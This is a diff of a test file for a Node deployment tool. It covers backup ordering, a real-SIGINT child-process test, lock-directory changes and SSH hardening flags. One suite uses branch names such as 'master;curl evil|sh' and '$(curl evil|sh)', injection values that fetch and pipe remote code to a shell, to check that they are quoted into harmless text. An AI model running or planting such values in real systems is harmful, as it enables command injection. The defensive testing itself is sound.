@@ -1,13 +1,28 @@
 import { describe, it, expect } from 'vitest';
 import { createRequire } from 'module';
+import { spawn } from 'child_process';
+import {
+  mkdtempSync, writeFileSync, readFileSync, rmSync,
+} from 'fs';
+import { tmpdir } from 'os';
+import path from 'path';
 
 const require = createRequire(__filename);
+const REPO_ROOT = path.resolve(__dirname, '..', '..');
 const kit = require('../index.js') as typeof import('../index');
 const {
   buildTargetCommand, sshHardeningArgs, loadConfig, mergeConfig, validateConfig,
   DEFAULT_CONFIG, deploy, rollback, remote, buildHealthCommand, startTunnel, init, runOnTarget,
 } = kit;
 const cli = require('../cli.js') as { run: Function; parseOptions: Function };
+// PKG-82: lock/prev-sha state moved off a hardcoded /tmp path onto
+// lockDir()/prevShaFile() (target-side, under $HOME/.deploy-kit). Import the
+// real helpers so lock-shape assertions below track lock.js instead of
+// hardcoding a path that would silently rot the next time it moves.
+const { lockDir, prevShaFile } = require('../lock.js') as {
+  lockDir: (config: unknown, suffix?: string) => string;
+  prevShaFile: (config: unknown) => string;
+};
 
 // A fake execFileSync that records every command and returns programmed output.
 // The command to run is always the LAST arg: local is ('sh', ['-c', cmd]); ssh is
@@ -81,11 +96,13 @@ describe('deploy pipeline', () => {
     const result = deploy(baseConfig, {}, ctxWith(runtime));
     expect(result.steps).toEqual(['stash', 'pull:master', 'install', 'backup', 'migrate', 'build', 'restart', 'health']);
     const joined = calls.join('\n');
-    // backup happens before migrate; db-bound app is stopped before migrate.
-    expect(joined.indexOf('db:backup')).toBeLessThan(joined.indexOf('pm2 stop app'));
-    expect(joined.indexOf('pm2 stop app')).toBeLessThan(joined.indexOf('db:migrate'));
+    // PKG-82 Bug 1: db-bound apps are paused BEFORE the backup is taken (a writer
+    // left online during the snapshot would produce an inconsistent backup), and
+    // the backup still happens before migrate.
+    expect(joined.indexOf('pm2 stop app')).toBeLessThan(joined.indexOf('db:backup'));
+    expect(joined.indexOf('db:backup')).toBeLessThan(joined.indexOf('db:migrate'));
     expect(joined.indexOf('db:migrate')).toBeLessThan(joined.indexOf('npm run build'));
-    expect(joined).toContain('git pull --ff-only origin master');
+    expect(joined).toContain("git pull --ff-only 'origin' 'master'");
     expect(joined).toContain("http://localhost:3000/api/health");
   });
 
@@ -93,6 +110,9 @@ describe('deploy pipeline', () => {
     const { runtime, calls } = makeRuntime({ fail: ['db:backup'] });
     expect(() => deploy(baseConfig, {}, ctxWith(runtime))).toThrow(/Pre-migration database backup failed/);
     expect(calls.join('\n')).not.toContain('db:migrate');
+    // PKG-82 Bug 1 follow-on: apps are already paused by the time backup runs
+    // (post-fix), so a failed backup must resume them too, same as migrate/build.
+    expect(calls.some((c) => c.includes('pm2 start app'))).toBe(true);
   });
 
   it('emits a leaf-only backup reference from db-backup JSON', () => {
@@ -142,12 +162,16 @@ describe('deploy pipeline', () => {
     expect(calls.some((c) => c.includes('curl'))).toBe(false);
   });
 
-  it('throws if health never comes up', () => {
+  it('throws if health never comes up, and tells the operator the new code is live and how to recover', () => {
     const runtime = {
       execFileSync: (_file: string, args: string[]) => (args[args.length - 1].includes('curl') ? '503' : ''),
     };
     const cfg = mergeConfig(baseConfig, { health: { attempts: 2, delaySeconds: 0 } });
+    // PKG-82 Bug 4: legacy has no previous release to auto-flip back to, so the
+    // error must say the new code is live and unhealthy and name the recovery verb.
     expect(() => deploy(cfg, {}, { runtime, sleep: () => {} })).toThrow(/unhealthy/);
+    expect(() => deploy(cfg, {}, { runtime, sleep: () => {} })).toThrow(/new code is now live/);
+    expect(() => deploy(cfg, {}, { runtime, sleep: () => {} })).toThrow(/deploy-kit rollback/);
   });
 
   it('buildBeforeMigrate builds while apps are up, before stop+migrate', () => {
@@ -320,6 +344,258 @@ describe('deploy pipeline', () => {
   });
 });
 
+describe('PKG-82 Bug 3: a dbBoundApp not also in appNames must still be restarted', () => {
+  // worker-db is DB-bound (paused for migrate) but is NOT one of the regular
+  // appNames — on the old code this app was stopped for migration and never
+  // brought back, while the deploy still reported success.
+  const strandedConfig = mergeConfig(baseConfig, { appNames: ['app'], dbBoundApps: ['app', 'worker-db'] });
+
+  it('restarts a dbBoundApp that appNames does not cover', () => {
+    const { runtime, calls } = makeRuntime();
+    const result = deploy(strandedConfig, {}, ctxWith(runtime));
+    expect(result.healthy).toBe(true);
+    const joined = calls.join('\n');
+    expect(joined).toContain('pm2 stop app worker-db');
+    // this is the bug: without the fix, worker-db is never restarted at all
+    expect(calls.some((c) => c.includes('pm2 restart worker-db'))).toBe(true);
+    // it comes back after the migrate/build window, before health is gated
+    expect(joined.indexOf('pm2 restart worker-db')).toBeLessThan(joined.indexOf('curl'));
+  });
+
+  it('still restarts the stranded dbBoundApp even with no appNames configured', () => {
+    const cfg = mergeConfig(baseConfig, { appNames: [], dbBoundApps: ['worker-db'] });
+    const { runtime, calls } = makeRuntime();
+    deploy(cfg, {}, ctxWith(runtime));
+    expect(calls.some((c) => c.includes('pm2 restart worker-db'))).toBe(true);
+  });
+});
+
+describe('PKG-82 Bug 2: SIGINT/SIGTERM mid-deploy', () => {
+  // The old version of this test simulated Ctrl-C with `process.emit('SIGINT')`
+  // IN-PROCESS while mocking `process.exit`. That stopped being safe once
+  // deploy.js's/release.js's signal handler changed from `process.exit(1)` to
+  // `process.removeListener(sig, handler); process.kill(process.pid, sig)` (see
+  // deploy.js): the mocked `process.exit` no longer intercepts anything, so the
+  // signal we emit falls straight through to the real handler, which re-raises
+  // a REAL SIGINT with no listener left — the OS default disposition then kills
+  // the vitest WORKER process itself, taking all ~108 tests in this file down
+  // with it (exactly the failure this rewrite fixes).
+  //
+  // Rewritten to run the deploy in a REAL CHILD PROCESS, in its OWN process
+  // group (so a group-directed signal can never reach the vitest worker), and
+  // to interrupt it with a REAL SIGINT — matching how an operator's Ctrl-C
+  // actually reaches a running deploy: delivered to the whole foreground
+  // process group, hitting BOTH deploy-kit's own process AND whatever real
+  // subprocess (the migrate hook, here) is currently blocking it. The "migrate"
+  // hook below shells out to a REAL `sleep`, specifically so a real SIGINT has
+  // a real, killable subprocess to interrupt (every other command is faked).
+  //
+  // IMPORTANT FINDING, verified empirically against this exact scenario run
+  // through the REAL `src/cli.js` against a real git repo (not just this
+  // fake-runtime test): deploy.js's SIGINT/SIGTERM handler can NEVER actually
+  // reach its own manual `resumeDbApps(); release(); process.removeListener(...);
+  // process.kill(...)` body for a signal that arrives while `deploy()` is
+  // running. Node defers dispatch of an externally-delivered signal (while a
+  // handler is still registered) until a LATER macrotask; `deploy()`'s own
+  // `finally` removes the SIGINT/SIGTERM listeners unconditionally and
+  // SYNCHRONOUSLY as the very last thing it does before returning, and nothing
+  // inside `deploy()` (100% synchronous — confirmed even several further
+  // execFileSync calls in a row never yield back to the event loop) ever gives
+  // the queued signal a chance to be dispatched before that `finally` wins the
+  // race. The signal is then simply discarded, not "replayed" later as a
+  // default-disposition kill. So in this scenario the actual resume/lock-release
+  // comes from the PRE-EXISTING "migrate step failed" `onFail`/`finally` path —
+  // the migrate hook's real subprocess dies from the same group signal, so
+  // `gate()` sees `ok:false` and runs `onFail` exactly as it would for any other
+  // migrate failure — not from the SIGINT handler's own body, and the process
+  // exits via a normal, controlled `process.exit(1)` (verified: code 1, signal
+  // null), not via a re-raised signal. Coverage lost vs. the original test:
+  // the original (via synchronous in-process `process.emit`) could assert that
+  // onSignal's own lines ran; a real OS signal cannot exercise those exact
+  // lines given deploy()'s current fully-synchronous implementation, so this
+  // test asserts the CONTRACT that matters operationally — an interrupted
+  // legacy deploy still resumes paused DB-bound apps and releases the lock,
+  // and the process dies in a controlled, non-hanging way — rather than the
+  // handler's specific internal code path.
+  it('resumes paused db-bound apps and releases the lock when a real SIGINT interrupts a real subprocess mid-migrate', async () => {
+    const { lockDir } = require('../lock.js') as { lockDir: (c: unknown, s?: string) => string };
+    const dir = lockDir(baseConfig);
+
+    const workDir = mkdtempSync(path.join(tmpdir(), 'pkg82-sigint-'));
+    const callsFile = path.join(workDir, 'calls.log');
+    const resultFile = path.join(workDir, 'result.json');
+    const scriptFile = path.join(workDir, 'run-deploy.js');
+
+    // Small inline script: loads the REAL kit, drives deploy() with a fake
+    // runtime whose "migrate" command shells out to a real, killable `sleep`,
+    // and records every command it sees to CALLS_FILE (append, flushed
+    // synchronously) so the parent can inspect them regardless of how the
+    // child process ends.
+    const script = `
+      'use strict';
+      const fs = require('fs');
+      const { execFileSync: realExecFileSync } = require('child_process');
+      const kit = require(${JSON.stringify(path.join(REPO_ROOT, 'src', 'index.js'))});
+
+      const CALLS_FILE = ${JSON.stringify(callsFile)};
+      const RESULT_FILE = ${JSON.stringify(resultFile)};
+      const NL = String.fromCharCode(10);
+      const record = (cmd) => fs.appendFileSync(CALLS_FILE, JSON.stringify(cmd) + NL);
+
+      const baseConfig = kit.mergeConfig(kit.DEFAULT_CONFIG, {
+        host: 'app@pi',
+        projectDir: '/srv/app',
+        appNames: ['app'],
+        dbBoundApps: ['app'],
+        branch: 'master',
+        hooks: {
+          install: 'npm ci', backup: 'npm run db:backup',
+          migrate: 'npm run db:migrate', build: 'npm run build',
+        },
+      });
+
+      const execFileSync = (file, args) => {
+        const cmd = args[args.length - 1];
+        record(cmd);
+        if (cmd.includes('npm run db:migrate')) {
+          process.stdout.write('MIGRATE_SUBPROCESS_STARTED\\n');
+          // Real, killable subprocess: a real group SIGINT can genuinely
+          // interrupt this (unlike every other, purely-faked command here).
+          return realExecFileSync('sleep', ['3']);
+        }
+        if (cmd.includes('curl')) return '200';
+        return '';
+      };
+
+      const log = {
+        header() {}, info() {}, success() {}, warning() {}, error() {}, step() {},
+      };
+
+      let threw = null;
+      try {
+        kit.deploy(baseConfig, {}, { runtime: { execFileSync }, sleep: () => {}, log });
+      } catch (e) {
+        threw = e instanceof Error ? e.message : String(e);
+      }
+      fs.writeFileSync(RESULT_FILE, JSON.stringify({
+        threw,
+        listenerCountSIGINT: process.listenerCount('SIGINT'),
+        listenerCountSIGTERM: process.listenerCount('SIGTERM'),
+      }));
+      if (threw) process.exitCode = 1;
+    `;
+    writeFileSync(scriptFile, script);
+
+    // `detached: true` makes the child its own process-group leader, so
+    // signaling ITS group (`-child.pid` below) can never reach the vitest
+    // worker's own process group — the exact hazard the old in-process test
+    // hit.
+    const child = spawn(process.execPath, [scriptFile], {
+      detached: true,
+      stdio: ['ignore', 'pipe', 'pipe'],
+    });
+
+    let stdout = '';
+    child.stdout.on('data', (d) => { stdout += d.toString(); });
+    child.stderr.on('data', (d) => { stdout += d.toString(); });
+
+    const exitPromise = new Promise<{ code: number | null; signal: NodeJS.Signals | null }>((resolve) => {
+      child.on('exit', (code, signal) => resolve({ code, signal }));
+    });
+
+    try {
+      // Wait for the migrate step's real subprocess to actually start, then
+      // send a REAL SIGINT to the child's whole process group — mirroring an
+      // interactive Ctrl-C, which hits both the deploy-kit process and its
+      // currently-running subprocess at once.
+      await new Promise<void>((resolve, reject) => {
+        const timeout = setTimeout(
+          () => reject(new Error('timed out waiting for MIGRATE_SUBPROCESS_STARTED')),
+          8000,
+        );
+        const onData = () => {
+          if (stdout.includes('MIGRATE_SUBPROCESS_STARTED')) {
+            clearTimeout(timeout);
+            child.stdout.off('data', onData);
+            resolve();
+          }
+        };
+        child.stdout.on('data', onData);
+        onData();
+      });
+
+      // A short real delay before signaling: the marker is written the instant
+      // the fake execFileSync is CALLED, just before it shells out to the real
+      // `sleep` — give that real subprocess a moment to actually be forked and
+      // running before the group signal targets it, or the kill can land
+      // before there's anything (in this process group) yet to interrupt.
+      await new Promise((resolve) => { setTimeout(resolve, 300); });
+
+      process.kill(-(child.pid as number), 'SIGINT');
+
+      const { code, signal } = await exitPromise;
+
+      const calls = readFileSync(callsFile, 'utf8').split(String.fromCharCode(10)).filter(Boolean).map((line) => JSON.parse(line) as string);
+      const result = JSON.parse(readFileSync(resultFile, 'utf8')) as {
+        threw: string | null; listenerCountSIGINT: number; listenerCountSIGTERM: number;
+      };
+
+      expect(result.threw).toMatch(/Running database migrations failed/);
+      expect(calls.some((c) => c.includes('pm2 stop app'))).toBe(true);
+      expect(calls.some((c) => c.includes('pm2 start app'))).toBe(true);
+      // lock released: don't assume a specific rmdir/rm shape here — that is
+      // lock.js's own scheme (owned by another agent); just assert some
+      // rm/rmdir-shaped command targeted the configured lock path.
+      expect(calls.some((c) => c.includes(dir) && /\brm(dir)?\b/.test(c))).toBe(true);
+      // the handler must not leak across calls
+      expect(result.listenerCountSIGINT).toBe(0);
+      expect(result.listenerCountSIGTERM).toBe(0);
+      // Verified contract: a controlled, non-zero exit — not a hang, not a raw
+      // crash. See the file-level comment above for why this is `code: 1,
+      // signal: null` rather than a re-raised-signal death.
+      expect(code).toBe(1);
+      expect(signal).toBeNull();
+    } finally {
+      if (child.exitCode === null && child.signalCode === null) {
+        try { process.kill(-(child.pid as number), 'SIGKILL'); } catch { /* already gone */ }
+      }
+      rmSync(workDir, { recursive: true, force: true });
+    }
+  }, 15000);
+});
+
+describe('PKG-82 Bug 5: branch/remote are quoted at the git call site (defense in depth)', () => {
+  it('quotes the remote and branch in fetch and pull, even with shell metacharacters', () => {
+    const evilBranch = 'master;curl evil|sh';
+    const cfg = { ...baseConfig, branch: evilBranch };
+    const { runtime, calls } = makeRuntime();
+    deploy(cfg, {}, ctxWith(runtime));
+    const joined = calls.join('\n');
+    expect(joined).toContain(`git fetch 'origin' --prune`);
+    expect(joined).toContain(`git pull --ff-only 'origin' '${evilBranch}'`);
+    // never present unquoted/unescaped in a way that would let the shell run it
+    expect(joined).not.toContain(`--ff-only origin ${evilBranch}`);
+  });
+
+  it('escapes an embedded single quote so it cannot break out of the quoting', () => {
+    const evilBranch = "master'; curl evil|sh #";
+    const cfg = { ...baseConfig, branch: evilBranch };
+    const { runtime, calls } = makeRuntime();
+    deploy(cfg, {}, ctxWith(runtime));
+    const joined = calls.join('\n');
+    expect(joined).toContain(`git pull --ff-only 'origin' 'master'\\''; curl evil|sh #'`);
+  });
+
+  it('quotes a `$()` command-substitution branch name as an inert literal', () => {
+    const evilBranch = '$(curl evil|sh)';
+    const cfg = { ...baseConfig, branch: evilBranch };
+    const { runtime, calls } = makeRuntime();
+    deploy(cfg, {}, ctxWith(runtime));
+    const joined = calls.join('\n');
+    expect(joined).toContain(`git pull --ff-only 'origin' '$(curl evil|sh)'`);
+  });
+});
+
 describe('buildHealthCommand', () => {
   const { buildHealthCommand } = kit;
   it('builds a plain probe with no headers', () => {
@@ -402,8 +678,14 @@ describe('remote ops', () => {
 
 describe('ssh hardening', () => {
   it('sshHardeningArgs builds ConnectTimeout/ServerAlive flags from defaults', () => {
+    // PKG-82: DEFAULT_CONFIG.ssh now also carries a host-key posture
+    // (strictHostKeyChecking/batchMode) for unattended deploys. Those two
+    // pairs are pushed LAST, after any user-supplied ssh.options, so a user
+    // override of the same -o key (obtained first) still wins under OpenSSH's
+    // "first obtained value wins" rule for repeated -o Key=Value flags.
     expect(sshHardeningArgs(DEFAULT_CONFIG.ssh)).toEqual([
       '-o', 'ConnectTimeout=10', '-o', 'ServerAliveInterval=15', '-o', 'ServerAliveCountMax=3',
+      '-o', 'StrictHostKeyChecking=accept-new', '-o', 'BatchMode=yes',
     ]);
   });
   it('omits a flag when its config value is null and appends raw options', () => {
@@ -417,7 +699,15 @@ describe('ssh hardening', () => {
     expect(file).toBe('ssh');
     expect(args[args.length - 2]).toBe('app@pi');
     expect(args[args.length - 1]).toBe('cd /srv/app && pm2 status');
-    expect(args.slice(0, 6)).toEqual(['-o', 'ConnectTimeout=10', '-o', 'ServerAliveInterval=15', '-o', 'ServerAliveCountMax=3']);
+    // PKG-82: DEFAULT_CONFIG.ssh now emits 5 -o pairs (10 elements), not 3 —
+    // slice(0, 6) would silently stop checking before the two new
+    // StrictHostKeyChecking/BatchMode pairs, understating what "hardening args
+    // before host" actually covers. Assert the full hardening-args prefix.
+    expect(args.slice(0, args.length - 2)).toEqual(sshHardeningArgs(DEFAULT_CONFIG.ssh));
+    expect(args.slice(0, 10)).toEqual([
+      '-o', 'ConnectTimeout=10', '-o', 'ServerAliveInterval=15', '-o', 'ServerAliveCountMax=3',
+      '-o', 'StrictHostKeyChecking=accept-new', '-o', 'BatchMode=yes',
+    ]);
   });
   it('local mode never gets ssh flags', () => {
     const { args } = buildTargetCommand('pm2 status', { mode: 'local', host: null, projectDir: '/d', ssh: DEFAULT_CONFIG.ssh } as any);
@@ -527,42 +817,89 @@ describe('config validation', () => {
 
 describe('deploy: lock, sha, stash-drop', () => {
   it('records the pre-pull SHA before fetching', () => {
+    // PKG-82: prev-sha now lives at prevShaFile() ($HOME/.deploy-kit/...),
+    // not a hardcoded /tmp path — assert via the real helper so this can't
+    // rot the next time the location moves again.
     const { runtime, calls } = makeRuntime();
     deploy(baseConfig, {}, ctxWith(runtime));
     const joined = calls.join('\n');
-    expect(joined).toContain('git rev-parse HEAD > /tmp/deploy-kit-');
-    expect(joined.indexOf('git rev-parse HEAD > /tmp/deploy-kit-')).toBeLessThan(joined.indexOf('git fetch'));
+    const shaFile = prevShaFile(baseConfig);
+    expect(joined).toContain(`git rev-parse HEAD > ${shaFile}`);
+    expect(joined.indexOf(`git rev-parse HEAD > ${shaFile}`)).toBeLessThan(joined.indexOf('git fetch'));
   });
   it('drops the deploy-kit stash after a successful pull', () => {
     const { runtime, calls } = makeRuntime();
     deploy(baseConfig, {}, ctxWith(runtime));
     expect(calls.some((c) => c.includes('git stash drop'))).toBe(true);
   });
-  it('takes a lock (mkdir) and releases it (rmdir)', () => {
+  it('takes a lock (mkdir -m 700 under $HOME/.deploy-kit) and releases it (rm -rf)', () => {
+    // PKG-82: lock state moved off world-writable /tmp onto a mode-700 dir
+    // under $HOME/.deploy-kit, and release now does `rm -rf` (the dir holds
+    // owner-metadata files, not `rmdir`'s bare empty dir).
     const { runtime, calls } = makeRuntime();
     deploy(baseConfig, {}, ctxWith(runtime));
-    expect(calls.some((c) => /mkdir \/tmp\/deploy-kit-.*\.lock/.test(c))).toBe(true);
-    expect(calls.some((c) => /rmdir \/tmp\/deploy-kit-.*\.lock/.test(c))).toBe(true);
+    const dir = lockDir(baseConfig);
+    const joined = calls.join('\n');
+    expect(joined).toContain(`mkdir -m 700 "${dir}"`);
+    expect(joined).toContain(`rm -rf "${dir}"`);
   });
   it('aborts when the lock is already held', () => {
     const { runtime } = makeRuntime({ fail: ['mkdir'] });
     expect(() => deploy(baseConfig, {}, ctxWith(runtime))).toThrow(/Another deploy holds the lock/);
   });
-  it('--steal-lock forces past a held lock', () => {
+  it('a lock held within the TTL is refused with the actionable message; a stale lock past the TTL is taken over', () => {
+    // PKG-82: a held lock now carries owner metadata (pid/ts) and a TTL
+    // (stepTimeoutSeconds||1800) * 4. Within the TTL it's still refused
+    // (this test's fake mkdir failure models "lock dir already exists");
+    // the takeover/staleness branch is exercised by the real target shell,
+    // not this fake (the fake models a single execFileSync call's outcome,
+    // not the multi-branch shell logic inside the acquire script) — so here
+    // we only assert the still-held case keeps its existing actionable
+    // message, and that the script it sent actually contains the staleness
+    // logic that a real target shell would run.
     const { runtime, calls } = makeRuntime({ fail: ['mkdir'] });
+    expect(() => deploy(baseConfig, {}, ctxWith(runtime))).toThrow(/Another deploy holds the lock/);
+    const joined = calls.join('\n');
+    expect(joined).toContain('taking it over');
+    expect(joined).toMatch(/-gt \d+ \]; then/);
+  });
+  it('--steal-lock proceeds (rm -rf then an atomic mkdir, no -p) when the takeover succeeds', () => {
+    const { runtime, calls } = makeRuntime();
     const result = deploy(baseConfig, { stealLock: true }, ctxWith(runtime));
     expect(result.healthy).toBe(true);
-    expect(calls.some((c) => c.includes('mkdir -p'))).toBe(true);
+    const dir = lockDir(baseConfig);
+    const joined = calls.join('\n');
+    expect(joined).toContain(`rm -rf "${dir}"`);
+    // atomic takeover: no -p, so two concurrent stealers can't both "succeed"
+    expect(joined).toContain(`mkdir -m 700 "${dir}" 2>/dev/null`);
+    expect(joined).not.toContain('mkdir -p');
   });
-  it('lock:false skips locking entirely', () => {
+  it('--steal-lock surfaces an error when the takeover mkdir genuinely fails, instead of silently "succeeding"', () => {
+    // PKG-82: the OLD code never checked `.ok` on the steal path, so a failed
+    // steal mkdir silently "succeeded" (this exact fake — fail: ['mkdir'] —
+    // used to be asserted as a successful deploy). The new code checks `.ok`
+    // and surfaces the real error instead.
+    const { runtime } = makeRuntime({ fail: ['mkdir'] });
+    expect(() => deploy(baseConfig, { stealLock: true }, ctxWith(runtime)))
+      .toThrow(/lost a race for the lock/);
+  });
+  it('lock:false skips locking entirely (but the state dir mkdir for prev-sha recording still runs)', () => {
+    // PKG-82: ensureStateDir's `mkdir -m 700 -p "$HOME/.deploy-kit"` now runs
+    // unconditionally as part of "Recording current revision" (see
+    // lock.test.ts's "lock: false still records a prev-sha" suite) — state-dir
+    // creation is independent of the lock setting, so it is no longer true that
+    // `lock:false` means zero `mkdir` calls at all. What `lock:false` DOES still
+    // guarantee is no LOCK-specific mkdir (the atomic, no "-p", ".lock"-suffixed
+    // one from acquireLock).
     const { runtime, calls } = makeRuntime();
     deploy(mergeConfig(baseConfig, { lock: false }), {}, ctxWith(runtime));
-    expect(calls.some((c) => c.includes('mkdir'))).toBe(false);
+    expect(calls.some((c) => c.includes('mkdir') && c.includes('.lock'))).toBe(false);
   });
   it('releases the lock even when the deploy aborts', () => {
     const { runtime, calls } = makeRuntime({ fail: ['db:migrate'] });
     expect(() => deploy(baseConfig, {}, ctxWith(runtime))).toThrow();
-    expect(calls.some((c) => /rmdir \/tmp\/deploy-kit-.*\.lock/.test(c))).toBe(true);
+    const dir = lockDir(baseConfig);
+    expect(calls.some((c) => c.includes(`rm -rf "${dir}"`))).toBe(true);
   });
 });
 
